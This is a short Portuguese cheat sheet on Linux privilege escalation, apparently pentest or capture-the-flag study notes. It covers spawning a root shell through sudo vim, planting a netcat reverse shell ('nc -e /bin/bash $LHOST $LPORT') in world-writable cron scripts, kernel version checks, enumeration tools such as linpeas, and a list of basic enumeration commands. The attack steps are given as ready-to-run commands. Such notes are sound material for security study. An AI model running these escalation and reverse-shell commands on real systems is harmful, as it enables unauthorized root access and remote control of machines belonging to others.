# Escalação de Privilégio Linux

## PrivEsc explorando binário através do sudo
Devemos identificar os binários que podem ser executados com sudo com o comando `sudo -l` e à partir dai pesquisar por vulnerabiidades no binário.  

### GTFOBins
Busque por exploits para binários no [GTFOBins](https://gtfobins.github.io/#p).

### vim
Uma forma de explorar o **vim** seria utilizando a flag `-c` para enviar comandos através do editor de texto.  
```
sudo vim -c '!bash'
```

## PrivEsc através de permissões e CRON
Vamos verificar o diretório que contém os scripts que serão executados periodicamente através do comando `cat /etc/crontab` e logo em seguida podemos verificar os scripts dentro dos periodos específicos como hora em hora, diariamente, semanalmente e mensalmente com `ls /etc/cron.hourly`.  
Após identificar os scripts, podemos verificar quais possuem permissão total (777). Também podemos buscar por arquivos com permissão total através do comando `find / -type f -perm 777 2>/dev/null`.  
Com o script identificado, podemos inserir comandos que serão executados conforme o agendamento do script.
```
nc -e /bin/bash $LHOST $LPORT
```

## PrivEsc explorando o kernel  
Verifique a versão do kernel com `uname -a` e qual arquitetura. Também levante os dados do sistema operacional com `cat /etc/issue`.  

##

## Ferramentas

### Enumeração  
linpeas.sh  

### Pesquisa por vulnerabilidades
linus-exploit-suggester.sh

## Comandos básicos para enumeração    

Verificar nome da máquina  
```
hostname
```

Verificar informações sobre o sistema  
```
uname -a
```

Verificar versão do sistema operacional
```
cat /etc/issue
cat /etc/*-release
```

Verificar os programas instalados
```
dpkg -l | grep "wget"
```

Verficar segmentos de rede  
```
ifconfig -a
```

Verificar as tabelas de roteamento
```
route
```

Verificar portas abertas
```
netstat -nlpt
netstat -nlpu
```

Verificar procesos em execução
```
ps aux
```

Verificar tarefas agendadas  
```
cat /etc/crontab
```

Encontrar diretórios com permissão de escrita
```
find  / -writable -type d 2>/dev/null
```

Encontrar arquivos com permissão SUID
```
find  / -perm -u=s -type f 2>/dev/null
```

Listar programas com sudo habilitado para o usuário  
```
sudo -l
```

